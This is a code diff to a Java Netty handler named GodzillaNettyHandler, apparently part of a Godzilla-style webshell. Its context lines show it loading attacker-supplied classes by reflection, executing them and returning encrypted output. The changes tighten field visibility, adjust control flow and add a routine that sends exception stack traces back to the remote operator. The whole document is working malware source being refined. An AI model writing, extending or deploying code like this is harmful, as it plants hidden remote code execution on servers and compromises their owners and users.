@@ -11,6 +11,7 @@ import io.netty.util.CharsetUtil;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.ByteArrayOutputStream;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
@@ -23,11 +24,11 @@ import java.nio.charset.StandardCharsets;
  */
 @ChannelHandler.Sharable
 public class GodzillaNettyHandler extends ChannelDuplexHandler {
-    public static String key;
-    public static String pass;
-    public static String md5;
-    public static String headerName;
-    public static String headerValue;
+    private static String key;
+    private static String pass;
+    private static String md5;
+    private static String headerName;
+    private static String headerValue;
     private final StringBuilder requestBody = new StringBuilder();
     private HttpRequest request;
     private static Class<?> payload;
@@ -65,7 +66,6 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
                     if (payload == null) {
                         payload = reflectionDefineClass(data);
                         send(ctx, "");
-                        return;
                     } else {
                         Object f = payload.newInstance();
                         ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
@@ -74,10 +74,11 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
                         f.toString();
                         send(ctx, md5.substring(0, 16) + base64Encode(x(arrOut.toByteArray(), true)) + md5.substring(16));
                     }
-                    return;
                 } catch (Throwable e) {
                     e.printStackTrace();
+                    send(ctx, getErrorMessage(e));
                 }
+                return;
             }
             ctx.fireChannelRead(msg);
         }
@@ -144,5 +145,20 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
         response.headers().set("Content-Type", "text/plain; charset=UTF-8");
         response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
         ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
